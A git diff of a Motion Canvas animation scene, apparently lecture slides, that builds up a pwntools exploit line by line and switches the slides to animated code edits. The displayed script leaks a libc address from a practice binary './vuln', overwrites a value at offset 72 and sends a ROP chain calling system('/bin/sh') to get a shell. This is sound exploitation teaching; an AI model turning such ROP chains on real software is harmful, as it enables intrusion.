@@ -1,6 +1,6 @@
 import {Circle, Layout, Ray, Rect, Txt, makeScene2D} from '@motion-canvas/2d';
-import { CodeBlock, lines } from '@motion-canvas/2d/lib/components/CodeBlock';
-import {Reference, all, beginSlide, createRef, createSignal} from '@motion-canvas/core';
+import { CodeBlock, insert, lines } from '@motion-canvas/2d/lib/components/CodeBlock';
+import {DEFAULT, Reference, all, beginSlide, createRef, createSignal} from '@motion-canvas/core';
 
 const BACKGROUND = '#282C34';
 const RED = '#E06C75';
@@ -20,33 +20,32 @@ export default makeScene2D(function* (view) {
             code={"from pwm import *"}
             language='python'
             ref={cref}
+            fontSize={30}
         />);
     yield* beginSlide("first");
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(2,4))`from pwm import *${insert(`
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
-# nebo "kitty" a podobně`);
-    yield* cref().fontSize(30, .1);
+# nebo "kitty" a podobně`)}`;
     yield* beginSlide("setup");
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(6,8))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
-# nebo "kitty" a podobně
+# nebo "kitty" a podobně${insert(`
 
 io = process(["./vuln"])
 #io = remote("host", port)
 #io = gdb.debug("./vuln")
-`);
-    yield* cref().fontSize(24, .1);
+`)}`;
 
     yield* beginSlide("setup2");
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5)`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -55,15 +54,15 @@ context.terminal = ["tmux", "splitw", "-h"]
 io = process(["./vuln"])
 #io = remote("host", port)
 #io = gdb.debug("./vuln")
-
+${insert(`
 bin = ELF("./vuln")
 libc = ELF("./libc.so.6")
-`);
+`)}`;
 
     yield* beginSlide("setup3");
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(13,14))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -75,14 +74,14 @@ io = process(["./vuln"])
 
 bin = ELF("./vuln")
 libc = ELF("./libc.so.6")
-
+${insert(`
 io.recvuntil(b"Input: ")
 io.sendline(b"Hello, world!")
-`);
+`)}`;
 
     yield* beginSlide("io.sendline")
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(15,18))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -97,16 +96,18 @@ libc = ELF("./libc.so.6")
 
 io.recvuntil(b"Input: ")
 io.sendline(b"Hello, world!")
-
+${insert(`
 io.recvuntil(b"code: ")
 line = io.recvline()
 code = int(line.strip(), 16)
-`);
+`)}`;
 
     yield* beginSlide("code")
 
+    yield* cref().fontSize(24, .5)
 
-    cref().code(`from pwm import *
+
+    yield* cref().edit(.5, lines(19,23))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -125,17 +126,17 @@ io.sendline(b"Hello, world!")
 io.recvuntil(b"code: ")
 line = io.recvline()
 code = int(line.strip(), 16)
-
+${insert(`
 io.sendline(flat({
     0x8: 1,
     72: code,
 }))
-`);
+`)}`;
 
     yield* beginSlide("flat")
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(24,26))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -159,15 +160,15 @@ io.sendline(flat({
     0x8: 1,
     72: code,
 }))
-
+${insert(`
 offset = int(io.recvline(), 16)
 libc.address = offset
-`);
+`)}`;
 
     yield* beginSlide("offset")
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(27, 30))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -194,16 +195,16 @@ io.sendline(flat({
 
 offset = int(io.recvline(), 16)
 libc.address = offset
-
+${insert(`
 rop = ROP(libc, badchars=b'\\n')
 rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
 rop.call(libc.sym["exit"], [0])
-`);
+`)}`;
 
     yield* beginSlide("rop")
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(32))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -234,14 +235,14 @@ libc.address = offset
 rop = ROP(libc, badchars=b'\\n')
 rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
 rop.call(libc.sym["exit"], [0])
-
+${insert(`
 io.sendline(rop.chain())
-`);
+`)}`;
 
     yield* beginSlide("send rop")
 
 
-    cref().code(`from pwm import *
+    yield* cref().edit(.5, lines(34))`from pwm import *
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
@@ -274,9 +275,14 @@ rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
 rop.call(libc.sym["exit"], [0])
 
 io.sendline(rop.chain())
-
+${insert(`
 io.interactive()
-`);
+`)}`;
 
     yield* beginSlide("interactive")
+
+    yield* cref().selection(DEFAULT, .5);
+
+
+    yield* beginSlide("final");
 });
